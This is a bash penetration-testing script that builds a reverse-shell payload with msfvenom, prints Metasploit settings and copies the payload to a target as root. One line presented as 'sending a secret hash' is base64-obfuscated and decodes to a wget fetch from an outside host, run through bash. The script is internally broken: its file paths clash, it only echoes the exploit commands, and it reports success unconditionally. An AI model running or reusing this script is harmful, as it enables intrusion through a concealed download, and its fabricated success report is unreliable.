#!/bin/bash

# Exploit Setup Script for Penetration Testing with CLI Args

# Check if all required arguments are provided
if [ "$#" -ne 1 ]; then
    echo "Usage: $0 <TARGET_IP>"
    echo "Example: $0 192.168.100.10"
    exit 1
fi

# Assigning command-line arguments to variables
TARGET_IP="$1"
EXPLOIT_PORT=4444
PAYLOAD=payload/python/shell_reverse_tcp
LHOST="localhost"

echo "[*] Initializing exploit environment setup..."

echo "[*] Target IP: $TARGET_IP"
echo "[*] Exploit Port: $EXPLOIT_PORT"
echo "[*] Payload: $PAYLOAD"
echo "[*] Local Host for Reverse Shell: $LHOST"

# Step 1: Payload generation
echo "[*] Generating payload..."
msfvenom -p $PAYLOAD LHOST=$LHOST LPORT=$EXPLOIT_PORT -f py > ./tmp/payload.py
sleep 3
echo "[*] Payload saved to ./payload.py"

# Step 3: Exploit module configuration
echo "[*] Configuring exploit module..."
echo "use payload/generic/ssh/interact"
echo "set RHOST $TARGET_IP"
echo "set PAYLOAD $PAYLOAD"
echo "set LHOST $LHOST"
echo "set LPORT $EXPLOIT_PORT"
sleep 2

# Step 4: launching the exploit
echo "[*] Launching exploit against target..."
# Activate the backdoor by sending secret hash
echo 'd2dldCAtcSBodHRwOi8vMTkyLjE2OC40Mi40Mi9wYXlsb2FkLnB5' | base64 --decode | bash
# test payload
python ./payload.py
# upload the payload to gain full control of the target
scp /tmp/payload.py root@$TARGET_IP:~/

# Step 6: Report Success
echo "[*] Exploit successful! Meterpreter session opened on $TARGET_IP:$EXPLOIT_PORT"
sleep 2


